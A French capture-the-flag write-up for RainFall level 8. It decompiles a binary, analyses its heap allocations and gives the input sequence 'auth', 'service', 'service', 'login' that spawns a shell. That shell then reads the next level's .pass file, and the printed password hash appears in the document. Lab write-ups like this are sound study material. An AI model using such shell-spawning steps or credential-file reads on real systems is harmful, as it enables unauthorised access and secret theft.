# **Level 8**

Pour le `level8`, on test l'executable

```
level8@RainFall:~$ ./level8
(nil), (nil)
dd
(nil), (nil)
zz
(nil), (nil)
```

Il semblerait qu'il faut certains input pour faire réagir l'executable

Donc on decompile le code

```
undefined4 main(void)
{
  char cVar1;
  char *pcVar2;
  int iVar3;
  uint uVar4;
  byte *pbVar5;
  byte *pbVar6;
  bool bVar7;
  undefined uVar8;
  undefined uVar9;
  bool bVar10;
  undefined uVar11;
  byte bVar12;
  byte local_90 [5];
  char local_8b [2];
  char acStack_89 [125];
  
  bVar12 = 0;
  do {
    printf("%p, %p \n",auth,service);
    pcVar2 = fgets((char *)local_90,0x80,stdin);
    bVar7 = false;
    bVar10 = pcVar2 == (char *)0x0;
    if (bVar10) {
      return 0;
    }
    iVar3 = 5;
    pbVar5 = local_90;
    pbVar6 = (byte *)"auth ";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      bVar7 = *pbVar5 < *pbVar6;
      bVar10 = *pbVar5 == *pbVar6;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
    } while (bVar10);
    uVar8 = 0;
    uVar11 = (!bVar7 && !bVar10) == bVar7;
    if ((bool)uVar11) {
      auth = (undefined4 *)malloc(4);
      *auth = 0;
      uVar4 = 0xffffffff;
      pcVar2 = local_8b;
      do {
        if (uVar4 == 0) break;
        uVar4 = uVar4 - 1;
        cVar1 = *pcVar2;
        pcVar2 = pcVar2 + (uint)bVar12 * -2 + 1;
      } while (cVar1 != '\0');
      uVar4 = ~uVar4 - 1;
      uVar8 = uVar4 < 0x1e;
      uVar11 = uVar4 == 0x1e;
      if (uVar4 < 0x1f) {
        strcpy((char *)auth,local_8b);
      }
    }
    iVar3 = 5;
    pbVar5 = local_90;
    pbVar6 = (byte *)"reset";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      uVar8 = *pbVar5 < *pbVar6;
      uVar11 = *pbVar5 == *pbVar6;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
    } while ((bool)uVar11);
    uVar9 = 0;
    uVar8 = (!(bool)uVar8 && !(bool)uVar11) == (bool)uVar8;
    if ((bool)uVar8) {
      free(auth);
    }
    iVar3 = 6;
    pbVar5 = local_90;
    pbVar6 = (byte *)"service";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      uVar9 = *pbVar5 < *pbVar6;
      uVar8 = *pbVar5 == *pbVar6;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
    } while ((bool)uVar8);
    uVar11 = 0;
    uVar8 = (!(bool)uVar9 && !(bool)uVar8) == (bool)uVar9;
    if ((bool)uVar8) {
      uVar11 = (byte *)0xfffffff8 < local_90;
      uVar8 = acStack_89 == (char *)0x0;
      service = strdup(acStack_89);
    }
    iVar3 = 5;
    pbVar5 = local_90;
    pbVar6 = (byte *)"login";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      uVar11 = *pbVar5 < *pbVar6;
      uVar8 = *pbVar5 == *pbVar6;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
    } while ((bool)uVar8);
    if ((!(bool)uVar11 && !(bool)uVar8) == (bool)uVar11) {
      if (auth[8] == 0) {
        fwrite("Password:\n",1,10,stdout);
      }
      else {
        system("/bin/sh");
      }
    }
  } while( true );
}
```

En lisant le code on remarque que le code reagit sur les mots clés `auth (avec un espace)`, `service`, `login` et `reset`

En analysant on voit que le code lance un shell si `auth[8] != 0`

Lorsque l'on tape `auth ` ou `service`, cela alloue 16 bytes en memoire et `service` ecrit dedans

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
```

Donc pour que la condition soit respecte, il faut qu'il y ai 32 bytes d'ecarts en `auth` et `service`
soit un appel a `auth ` puis deux a `service` puis `login`

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

> ### NEXT : [Level 9](/level9/resources/README.md)
